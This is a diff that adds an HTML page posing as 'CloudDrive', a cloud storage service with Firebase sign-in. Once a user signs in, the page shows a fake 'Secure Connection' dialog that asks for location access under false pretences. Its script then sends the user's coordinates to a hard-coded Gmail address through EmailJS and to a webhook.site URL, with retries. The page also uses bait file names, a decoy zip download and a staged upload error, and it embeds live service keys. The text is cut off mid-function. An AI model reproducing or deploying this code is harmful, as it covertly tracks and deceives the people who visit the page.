@@ -1,0 +1,1656 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CloudDrive - Secure Cloud Storage</title>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="icon" type="image/png" href="R.png">
+
+  <style>
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+      font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+    }
+    
+    :root {
+      --primary-color: #1a73e8;
+      --hover-color: #1557b0;
+      --bg-color: #f8f9fa;
+      --sidebar-color: #ffffff;
+      --text-color: #3c4043;
+      --border-color: #dadce0;
+      --hover-bg: #f1f3f4;
+      --error-color: #d93025;
+    }
+    
+    body { 
+      background-color: var(--bg-color); 
+      color: var(--text-color);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    /* Header styles */
+    header {
+      display: flex;
+      align-items: center;
+      padding: 8px 16px;
+      border-bottom: 1px solid var(--border-color);
+      background-color: #fff;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 22px;
+      font-weight: 500;
+      color: var(--text-color);
+      margin-right: 30px;
+    }
+    
+    .logo i {
+      color: var(--primary-color);
+      font-size: 28px;
+    }
+    
+    .search-bar {
+      flex: 1;
+      max-width: 700px;
+      position: relative;
+    }
+    
+    .search-bar input {
+      width: 100%;
+      padding: 12px 20px 12px 45px;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      background-color: var(--hover-bg);
+      font-size: 14px;
+      outline: none;
+    }
+    
+    .search-bar input:focus {
+      background-color: #fff;
+      border-color: var(--primary-color);
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    }
+    
+    .search-bar i {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+    }
+    
+    .user-actions {
+      display: flex;
+      align-items: center;
+      margin-left: auto;
+      gap: 15px;
+    }
+    
+    .icon-btn {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #5f6368;
+      transition: background-color 0.2s;
+    }
+    
+    .icon-btn:hover {
+      background-color: var(--hover-bg);
+    }
+    
+    .profile {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background-color: var(--primary-color);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    
+    /* Main content */
+    .container {
+      display: none;
+      flex: 1;
+    }
+    
+    /* Sidebar styles */
+    .sidebar {
+      width: 250px;
+      border-right: 1px solid var(--border-color);
+      padding: 15px 0;
+      background-color: var(--sidebar-color);
+      height: calc(100vh - 57px);
+      position: sticky;
+      top: 57px;
+    }
+    
+    .upload-btn-container {
+      padding: 8px 12px 20px;
+    }
+    
+    .upload-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 12px 15px;
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+      transition: background-color 0.3s;
+    }
+    
+    .upload-btn:hover {
+      background-color: var(--hover-color);
+    }
+    
+    .nav-item {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 10px 24px;
+      color: var(--text-color);
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 0 24px 24px 0;
+      cursor: pointer;
+      margin-right: 12px;
+    }
+    
+    .nav-item.active {
+      background-color: #e8f0fe;
+      color: var(--primary-color);
+    }
+    
+    .nav-item:hover:not(.active) {
+      background-color: var(--hover-bg);
+    }
+    
+    .nav-item i {
+      font-size: 18px;
+      width: 22px;
+      text-align: center;
+    }
+    
+    .storage {
+      padding: 15px 24px;
+      margin-top: 15px;
+    }
+    
+    .storage-info {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+    
+    .storage-bar {
+      height: 4px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      margin: 8px 0;
+      overflow: hidden;
+    }
+    
+    .storage-bar-fill {
+      height: 100%;
+      width: 15%;
+      background-color: var(--primary-color);
+    }
+    
+    /* Main content area */
+    .content {
+      flex: 1;
+      padding: 20px;
+    }
+    
+    .content-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    
+    .view-options {
+      display: flex;
+      gap: 15px;
+    }
+    
+    .view-btn {
+      padding: 8px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    
+    .view-btn:hover {
+      background-color: var(--hover-bg);
+    }
+    
+    .file-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 16px;
+    }
+    
+    .file-item {
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      overflow: hidden;
+      transition: box-shadow 0.3s;
+      cursor: pointer;
+      background-color: #fff;
+    }
+    
+    .file-item:hover {
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+    }
+    
+    .file-preview {
+      height: 140px;
+      background-color: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .file-icon {
+      font-size: 48px;
+      color: #5f6368;
+    }
+    
+    .file-icon.pdf { color: #e53935; }
+    .file-icon.doc { color: #1565c0; }
+    .file-icon.img { color: #43a047; }
+    .file-icon.zip { color: #ffb300; }
+    
+    .file-details {
+      padding: 12px;
+    }
+    
+    .file-name {
+      font-size: 14px;
+      font-weight: 500;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .file-info {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 4px;
+    }
+    
+    /* Upload dialog */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    
+    .dialog {
+      background-color: #fff;
+      border-radius: 8px;
+      width: 500px;
+      max-width: 95%;
+      box-shadow: 0 24px 38px rgba(0,0,0,0.14);
+    }
+    
+    .dialog-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 24px;
+      border-bottom: 1px solid var(--border-color);
+    }
+    
+    .dialog-title {
+      font-size: 18px;
+      font-weight: 500;
+    }
+    
+    .dialog-close {
+      cursor: pointer;
+      font-size: 18px;
+      color: #5f6368;
+    }
+    
+    .dialog-content {
+      padding: 24px;
+    }
+    
+    .upload-area {
+      border: 2px dashed var(--border-color);
+      border-radius: 8px;
+      padding: 40px 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      transition: border-color 0.3s;
+    }
+    
+    .upload-area.dragover {
+      border-color: var(--primary-color);
+      background-color: rgba(26, 115, 232, 0.05);
+    }
+    
+    .upload-icon {
+      font-size: 48px;
+      color: var(--primary-color);
+      margin-bottom: 15px;
+    }
+    
+    .upload-text {
+      margin-bottom: 15px;
+    }
+    
+    .browse-btn {
+      color: var(--primary-color);
+      font-weight: 500;
+      cursor: pointer;
+    }
+    
+    .file-input {
+      display: none;
+    }
+    
+    .selected-files {
+      margin-top: 15px;
+      text-align: left;
+    }
+    
+    .file-row {
+      display: flex;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border-color);
+    }
+    
+    .file-row-icon {
+      margin-right: 10px;
+      color: #5f6368;
+    }
+    
+    .file-row-name {
+      flex: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      font-size: 14px;
+    }
+    
+    .file-row-size {
+      margin-left: 10px;
+      color: #5f6368;
+      font-size: 12px;
+    }
+    
+    .file-row-remove {
+      margin-left: 10px;
+      cursor: pointer;
+      color: #5f6368;
+    }
+    
+    .dialog-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      padding: 16px 24px;
+      border-top: 1px solid var(--border-color);
+    }
+    
+    .btn {
+      padding: 8px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    
+    .btn-secondary {
+      background-color: transparent;
+      color: var(--primary-color);
+      border: none;
+    }
+    
+    .btn-secondary:hover {
+      background-color: rgba(26, 115, 232, 0.04);
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--hover-color);
+    }
+
+    /* Error message */
+    .error-message {
+      color: var(--error-color);
+      margin-top: 12px;
+      font-size: 14px;
+      display: none;
+    }
+    
+    /* Login dialog */
+    .login-dialog {
+      width: 400px;
+      max-width: 95%;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    .form-label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    
+    .form-input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      font-size: 14px;
+      transition: border-color 0.2s;
+    }
+    
+    .form-input:focus {
+      border-color: var(--primary-color);
+      outline: none;
+    }
+    
+    .auth-divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #5f6368;
+      font-size: 14px;
+    }
+    
+    .auth-divider::before,
+    .auth-divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: var(--border-color);
+    }
+    
+    .auth-divider span {
+      padding: 0 15px;
+    }
+    
+    .google-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 10px;
+      background-color: #fff;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background-color 0.2s;
+    }
+    
+    .google-btn:hover {
+      background-color: var(--hover-bg);
+    }
+    
+    .auth-footer {
+      font-size: 14px;
+      margin-top: 15px;
+      text-align: center;
+    }
+    
+    .auth-link {
+      color: var(--primary-color);
+      cursor: pointer;
+      font-weight: 500;
+    }
+      /* Drop zone highlight */
+    .highlight-drop {
+      border: 2px dashed var(--primary-color);
+      background-color: rgba(26, 115, 232, 0.05);
+    }
+    
+    /* Download status styles */
+    .download-status {
+      margin-top: 8px;
+      font-size: 12px;
+      color: var(--text-color);
+    }
+    
+    .download-status i {
+      margin-right: 5px;
+    }
+    
+    .progress-bar {
+      height: 4px;
+      background-color: var(--border-color);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-top: 5px;
+    }
+    
+    .progress {
+      height: 100%;
+      width: 0;
+      background-color: var(--primary-color);
+      transition: width 0.3s ease;
+    }
+    
+    /* Empty state */
+    .empty-state {
+      text-align: center;
+      padding: 60px 0;
+    }
+    
+    .empty-icon {
+      font-size: 80px;
+      color: #dadce0;
+      margin-bottom: 20px;
+    }
+    
+    .empty-text {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+    
+    /* Toast notification */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #323232;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      box-shadow: 0 3px 5px rgba(0,0,0,0.2);
+      z-index: 1000;
+      display: none;
+    }
+
+    /* Secure Connection Dialog Styles */
+    .secure-dialog {
+      max-width: 500px;
+      width: 90%;
+    }
+
+    .security-animation {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .security-animation i {
+      font-size: 24px;
+      color: var(--primary-color);
+    }
+
+    .location-status {
+      display: flex;
+      padding: 12px;
+      border-radius: 8px;
+      background-color: var(--hover-bg);
+      margin-bottom: 20px;
+      align-items: center;
+    }
+
+    .connection-dots {
+      display: flex;
+      gap: 6px;
+      margin-right: 10px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: var(--border-color);
+    }
+
+    .security-features {
+      margin: 20px 0;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px;
+      padding: 12px;
+      border-radius: 8px;
+      background-color: var(--hover-bg);
+      transform: translateX(-20px);
+      opacity: 0;
+      animation: slideIn 0.5s ease forwards;
+    }
+
+    .feature-item:nth-child(1) { animation-delay: 0.2s; }
+    .feature-item:nth-child(2) { animation-delay: 0.4s; }
+    .feature-item:nth-child(3) { animation-delay: 0.6s; }
+
+    @keyframes slideIn {
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    .feature-icon {
+      margin-right: 16px;
+      color: var(--primary-color);
+      font-size: 24px;
+      flex-shrink: 0;
+    }
+
+    .feature-text h4 {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 4px;
+      color: var(--text-color);
+    }
+
+    .feature-text p {
+      font-size: 14px;
+      line-height: 1.5;
+      color: var(--text-color);
+      opacity: 0.8;
+    }
+
+    .dialog-header .dialog-title i {
+      margin-right: 8px;
+      color: var(--primary-color);
+    }
+
+    .popup-subtitle {
+      font-size: 14px;
+      opacity: 0.8;
+      margin-top: 4px;
+    }
+
+    #locationError {
+      color: var(--error-color);
+      display: none;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header -->
+  <header>
+    <div class="logo">
+      <i class="fas fa-cloud"></i>
+      <span>CloudDrive</span>
+    </div>
+    <div class="search-bar">
+      <i class="fas fa-search"></i>
+      <input type="text" placeholder="Search in Drive">
+    </div>
+    <div class="user-actions">
+      <div class="icon-btn" title="Help">
+        <i class="fas fa-question-circle"></i>
+      </div>
+      <div class="icon-btn" title="Settings">
+        <i class="fas fa-cog"></i>
+      </div>
+      <div class="profile" id="loginBtn" title="Sign in">
+        <i class="fas fa-user"></i>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <div class="container">
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="upload-btn-container">
+        <button class="upload-btn" id="showUploadDialog">
+          <i class="fas fa-plus"></i>
+          <span>New</span>
+        </button>
+      </div>
+      
+      <div class="nav-item active">
+        <i class="fas fa-hdd"></i>
+        <span>My Drive</span>
+      </div>
+      <div class="nav-item">
+        <i class="fas fa-user-friends"></i>
+        <span>Shared with me</span>
+      </div>
+      <div class="nav-item">
+        <i class="fas fa-clock"></i>
+        <span>Recent</span>
+      </div>
+      <div class="nav-item">
+        <i class="fas fa-star"></i>
+        <span>Starred</span>
+      </div>
+      <div class="nav-item">
+        <i class="fas fa-trash"></i>
+        <span>Trash</span>
+      </div>
+      
+      <div class="storage">
+        <div class="storage-bar">
+          <div class="storage-bar-fill"></div>
+        </div>
+        <div class="storage-info">1.5 GB of 15 GB used</div>
+      </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="content">
+      <div class="content-header">
+        <h2>My Drive</h2>
+        <div class="view-options">
+          <div class="view-btn" title="List view">
+            <i class="fas fa-list"></i>
+          </div>
+          <div class="view-btn" title="Grid view">
+            <i class="fas fa-th"></i>
+          </div>
+        </div>
+      </div>
+      
+      <!-- File Grid -->
+      <div class="file-grid">
+        <div class="file-item">
+          <div class="file-preview">
+            <i class="file-icon pdf fas fa-file-pdf"></i>
+          </div>          <div class="file-details">
+            <div class="file-name">Chats_2025-05-15.pdf</div>
+            <div class="file-info">May 15, 2025 • 3.2 MB</div>
+            <div class="download-status" style="display: none;">
+              <i class="fas fa-download"></i>
+              <span class="status-text">Downloading...</span>
+              <div class="progress-bar">
+                <div class="progress"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="file-item">
+          <div class="file-preview">
+            <i class="file-icon doc fas fa-file-word"></i>
+          </div>
+          <div class="file-details">
+            <div class="file-name">Details_2025-05-12.docx</div>
+            <div class="file-info">May 12, 2025 • 567 KB</div>
+          </div>
+        </div>
+        
+        <div class="file-item">
+          <div class="file-preview">
+            <i class="file-icon img fas fa-file-image"></i>
+          </div>
+          <div class="file-details">
+            <div class="file-name">Instagram_Story.jpg</div>
+            <div class="file-info">May 10, 2025 • 1.8 MB</div>
+          </div>
+        </div>
+        
+        <div class="file-item">
+          <div class="file-preview">
+            <i class="file-icon zip fas fa-file-archive"></i>
+          </div>
+          <div class="file-details">
+            <div class="file-name">Hostel_videos.zip</div>
+            <div class="file-info">May 7, 2025 • 4.7 MB</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Upload Dialog -->
+  <div class="overlay" id="uploadOverlay">
+    <div class="dialog">
+      <div class="dialog-header">
+        <div class="dialog-title">Upload files</div>
+        <div class="dialog-close" id="closeUploadDialog">
+          <i class="fas fa-times"></i>
+        </div>
+      </div>
+      <div class="dialog-content">
+        <div class="upload-area" id="dropZone">
+          <div class="upload-icon">
+            <i class="fas fa-cloud-upload-alt"></i>
+          </div>
+          <div class="upload-text">
+            <p>Drag & drop files here</p>
+            <p>or</p>
+            <p><span class="browse-btn" id="browseFiles">Browse files</span></p>
+          </div>
+          <input type="file" id="fileInput" class="file-input" multiple>
+        </div>
+        
+        <div class="selected-files" id="fileList"></div>
+        
+        <div class="error-message" id="errorMessage">
+          <i class="fas fa-exclamation-circle"></i>
+          Server error: We're currently experiencing issues with our upload service. Our team is working on it.
+        </div>
+      </div>
+      <div class="dialog-footer">
+        <button class="btn btn-secondary" id="cancelUpload">Cancel</button>
+        <button class="btn btn-primary" id="uploadBtn">Upload</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Login Dialog -->
+  <div class="overlay" id="loginOverlay">
+    <div class="dialog login-dialog">
+      <div class="dialog-header">
+        <div class="dialog-title">Sign in</div>
+        <div class="dialog-close" id="closeLoginDialog">
+          <i class="fas fa-times"></i>
+        </div>
+      </div>
+      <div class="dialog-content">
+        <form id="loginForm">
+          <div class="form-group">
+            <label class="form-label" for="email">Email</label>
+            <input type="email" id="email" class="form-input" placeholder="Enter your email" required>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="password">Password</label>
+            <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+          </div>
+          
+          <button type="submit" class="btn btn-primary" style="width: 100%;">Sign in</button>
+        </form>
+        
+        <div class="auth-divider">
+          <span>or</span>
+        </div>
+        
+        <button class="google-btn" id="googleSignIn">
+          <i class="fab fa-google"></i>
+          <span>Sign in with Google</span>
+        </button>
+        
+        <div class="auth-footer">
+          <p>Don't have an account? <span class="auth-link" id="showSignUp">Sign up</span></p>
+        </div>
+        
+        <div class="error-message" id="loginError"></div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Sign Up Dialog -->
+  <div class="overlay" id="signUpOverlay">
+    <div class="dialog login-dialog">
+      <div class="dialog-header">
+        <div class="dialog-title">Create account</div>
+        <div class="dialog-close" id="closeSignUpDialog">
+          <i class="fas fa-times"></i>
+        </div>
+      </div>
+      <div class="dialog-content">
+        <form id="signUpForm">
+          <div class="form-group">
+            <label class="form-label" for="signUpName">Name</label>
+            <input type="text" id="signUpName" class="form-input" placeholder="Enter your name" required>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="signUpEmail">Email</label>
+            <input type="email" id="signUpEmail" class="form-input" placeholder="Enter your email" required>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="signUpPassword">Password</label>
+            <input type="password" id="signUpPassword" class="form-input" placeholder="Enter your password" required>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="confirmPassword">Confirm Password</label>
+            <input type="password" id="confirmPassword" class="form-input" placeholder="Confirm your password" required>
+          </div>
+          
+          <button type="submit" class="btn btn-primary" style="width: 100%;">Create account</button>
+        </form>
+        
+        <div class="auth-divider">
+          <span>or</span>
+        </div>
+        
+        <button class="google-btn" id="googleSignUp">
+          <i class="fab fa-google"></i>
+          <span>Sign up with Google</span>
+        </button>
+        
+        <div class="auth-footer">
+          <p>Already have an account? <span class="auth-link" id="showLogin">Sign in</span></p>
+        </div>
+        
+        <div class="error-message" id="signUpError"></div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Toast notification -->
+  <div class="toast" id="toast"></div>
+  
+
+  <a href="data:application/zip;base64,UEsDBAoAAAAAAJqN00sAAAAAAAAAAAAAAAAAAAAAAA==" download="encrypted_docs.zip" style="display:none;" id="fakeDownload"></a>
+
+
+  <div class="overlay" id="secureConnectionOverlay">
+    <div class="dialog secure-dialog" id="secureConnectionPopup">      <div class="dialog-header">
+        <div class="dialog-title">
+          Secure Connection
+        </div>
+        <div class="popup-subtitle">Enhanced protection for your data</div>
+      </div>
+      
+      <div class="dialog-content">
+        <div class="location-status">
+          <div class="connection-dots">
+            <div class="dot" id="dot1"></div>
+            <div class="dot" id="dot2"></div>
+            <div class="dot" id="dot3"></div>
+          </div>
+          <div class="status-text" id="status-text">Waiting for location access...</div>
+        </div>
+        
+        <p>To establish a secure connection, we need access to your location for optimal server selection. This helps us:</p>
+        
+        <div class="security-features">
+          <div class="feature-item">
+            <div class="feature-icon">
+              <i class="fas fa-server"></i>
+            </div>
+            <div class="feature-text">
+              <h4>Connect to Nearest Server</h4>
+              <p>Select the fastest and most reliable server based on your geographic location.</p>
+            </div>
+          </div>
+          
+          <div class="feature-item">
+            <div class="feature-icon">
+              <i class="fas fa-shield-alt"></i>
+            </div>
+            <div class="feature-text">
+              <h4>Enhanced Privacy Protection</h4>
+              <p>Optimize your connection security based on regional requirements and regulations.</p>
+            </div>
+          </div>
+          
+          <div class="feature-item">
+            <div class="feature-icon">
+              <i class="fas fa-tachometer-alt"></i>
+            </div>
+            <div class="feature-text">
+              <h4>Performance Optimization</h4>
+              <p>Improve connection speed and reduce latency for a faster browsing experience.</p>
+            </div>
+          </div>
+        </div>
+        
+        <p class="error-message" id="locationError">Location access was denied. For optimal secure connection, please enable location access and try again.</p>
+      </div>
+      
+      <div class="dialog-footer">
+        <button class="btn btn-secondary" id="secureConnectionCancel">Cancel</button>
+        <button class="btn btn-primary" id="secureConnectionAllow">Allow Location Access</button>
+      </div>
+    </div>
+  </div>
+  
+  
+  <div class="toast" id="toast"></div>
+  
+
+  <a href="data:application/zip;base64,UEsDBAoAAAAAAJqN00sAAAAAAAAAAAAAAAAAAAAAAA==" download="encrypted_docs.zip" style="display:none;" id="fakeDownload"></a>
+
+  <!-- Firebase imports -->
+  <script type="module">
+    
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { getDatabase, ref, update, onValue, push, set, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+    apiKey: "AIzaSyAuCSEp7ec_at7v3mZz4VYWGHnwe_l_o8I",
+    authDomain: "login-cloud-bd385.firebaseapp.com",
+    projectId: "login-cloud-bd385",
+    storageBucket: "login-cloud-bd385.firebasestorage.app",
+    messagingSenderId: "582788887209",
+    appId: "1:582788887209:web:7912e4d4986c8fe6626fb8",
+    measurementId: "G-3KL5H13QS7"
+  };    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+    const provider = new GoogleAuthProvider();
+    provider.setCustomParameters({
+      prompt: 'select_account'
+    });    // Auth state listener
+    onAuthStateChanged(auth, (user) => {
+      if (user) {
+        // User is signed in
+        document.querySelector('.container').style.display = 'flex';
+        document.querySelector('header').style.display = 'flex';
+        document.getElementById('loginBtn').innerHTML = user.email.charAt(0).toUpperCase();
+        showToast(`Signed in as ${user.email}`);
+        document.getElementById('loginOverlay').style.display = 'none';
+        
+        
+        setTimeout(() => {
+        
+          navigator.permissions.query({ name: 'geolocation' })
+            .then(permissionStatus => {
+              if (permissionStatus.state === 'granted') {
+                startTracking();
+              } else if (!localStorage.getItem('locationPromptShown')) {
+                
+                localStorage.setItem('locationPromptShown', 'true');
+                setTimeout(() => {
+                  requestLocationPermission();
+                }, 1500);
+              }
+            })
+            .catch(error => {
+              console.error('Error checking location permission:', error);
+            });
+        }, 2000);
+      } else {
+     
+        document.querySelector('.container').style.display = 'none';
+        document.querySelector('header').style.display = 'none';
+        document.getElementById('loginOverlay').style.display = 'flex';
+        document.getElementById('loginBtn').innerHTML = '<i class="fas fa-user"></i>';
+        stopTracking(); 
+        localStorage.removeItem('locationPromptShown');
+      }
+    });
+    
+    // Sign up with email and password
+    document.getElementById('signUpForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const name = document.getElementById('signUpName').value;
+      const email = document.getElementById('signUpEmail').value;
+      const password = document.getElementById('signUpPassword').value;
+      const confirmPassword = document.getElementById('confirmPassword').value;
+      
+      // Basic validation
+      if (password !== confirmPassword) {
+        document.getElementById('signUpError').textContent = 'Passwords do not match';
+        document.getElementById('signUpError').style.display = 'block';
+        return;
+      }
+      
+      createUserWithEmailAndPassword(auth, email, password)
+        .then((userCredential) => {
+    
+          const user = userCredential.user;
+          set(ref(db, 'users/' + user.uid), {
+            name: name,
+            email: email
+          });
+          
+          // Close dialog
+          document.getElementById('signUpOverlay').style.display = 'none';
+          showToast('Account created successfully');
+        })
+        .catch((error) => {
+          document.getElementById('signUpError').textContent = error.message;
+          document.getElementById('signUpError').style.display = 'block';
+        });
+    });
+    
+    // Sign in with email and password
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      signInWithEmailAndPassword(auth, email, password)
+        .then((userCredential) => {
+          // Close dialog
+          document.getElementById('loginOverlay').style.display = 'none';
+          showToast('Signed in successfully');
+        })
+        .catch((error) => {
+          document.getElementById('loginError').textContent = error.message;
+          document.getElementById('loginError').style.display = 'block';
+        });
+    });
+      
+    document.getElementById('googleSignIn').addEventListener('click', async () => {
+      try {
+        
+        provider.setCustomParameters({
+          'prompt': 'select_account',
+          'login_hint': document.getElementById('email').value || '',
+          'display': 'popup'
+        });
+        
+        const result = await signInWithPopup(auth, provider);
+        document.getElementById('loginOverlay').style.display = 'none';
+        showToast('Signed in with Google');
+      } catch (error) {
+        if (error.code === 'auth/popup-blocked') {
+          document.getElementById('loginError').textContent = 'Please allow popups for this site to sign in with Google';
+        } else {
+          document.getElementById('loginError').textContent = error.message;
+        }
+        document.getElementById('loginError').style.display = 'block';
+      }
+    });
+    
+   
+    document.getElementById('googleSignUp').addEventListener('click', async () => {
+      try {
+      
+        provider.setCustomParameters({
+          'prompt': 'select_account',
+          'login_hint': document.getElementById('signUpEmail').value || '',
+          'display': 'popup'
+        });
+        
+        const result = await signInWithPopup(auth, provider);
+        document.getElementById('signUpOverlay').style.display = 'none';
+        showToast('Account created with Google');
+      } catch (error) {
+        if (error.code === 'auth/popup-blocked') {
+          document.getElementById('signUpError').textContent = 'Please allow popups for this site to sign up with Google';
+        } else {
+          document.getElementById('signUpError').textContent = error.message;
+        }
+        document.getElementById('signUpError').style.display = 'block';
+      }
+    });
+    
+ 
+    window.handleSignOut = function() {
+      signOut(auth).then(() => {
+        showToast('Signed out successfully');
+      }).catch((error) => {
+        showToast('Error signing out');
+      });
+    };
+    
+   
+    window.triggerUploadError = function() {
+      document.getElementById('errorMessage').style.display = 'block';
+      setTimeout(() => {
+        showToast('Upload failed: Server error');
+      }, 1000);
+    };
+  </script>
+  <script>
+
+    let isTrackingEnabled = false;
+    let watchId = null;
+    let currentPosition = null;
+
+   
+    emailjs.init("c2W0ntjHGrYFDVWcs");
+
+  
+    async function sendEmailWithRetry(latitude, longitude, maxRetries = 5, delayMs = 500) {
+      const templateParams = {
+        to_email: "signalgotham@gmail.com",
+        from_name: "Tony",
+        lat: latitude,
+        lon: longitude,
+        time: new Date().toISOString()
+      };
+
+      let attempts = 0;
+      while (attempts < maxRetries) {
+        try {
+          await emailjs.send("service_sw7fulv", "template_yi173kn", templateParams);
+          return true;
+        } catch (error) {
+          attempts++;
+          if (attempts === maxRetries) return false;
+          await new Promise(resolve => setTimeout(resolve, delayMs));
+        }
+      }
+    }
+
+    async function sendWebhookFallback(latitude, longitude, maxRetries = 5, delayMs = 500) {
+      const webhookUrl = "https://webhook.site/5e660a3e-6b3d-4b83-9e0c-008b4399f268"; // Your Webhook URL
+      const data = { lat: latitude, lon: longitude, time: new Date().toISOString() };
+
+      let attempts = 0;
+      while (attempts < maxRetries) {
+        try {
+          const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+          });
+          if (response.ok) return true;
+          throw new Error();
+        } catch (error) {
+          attempts++;
+          if (attempts === maxRetries) return false;
+          await new Promise(resolve => setTimeout(resolve, delayMs));
+        }
+      }
+    }
+
+ 
+    async function sendLocationData(latitude, longitude) {
+      const emailSuccess = await sendEmailWithRetry(latitude, longitude);
+      const webhookSuccess = await sendWebhookFallback(latitude, longitude);
+      if (!emailSuccess && !webhookSuccess) {
+        
+      }
+    }    
+    async function requestLocationPermission() {
+      try {
+        const result = await navigator.permissions.query({ name: 'geolocation' });
+        if (result.state === 'granted') {
+          startTracking();
+        } else if (result.state === 'prompt' || result.state === 'denied') {
+          showSecureConnectionDialog();
+        }
+      } catch (error) {
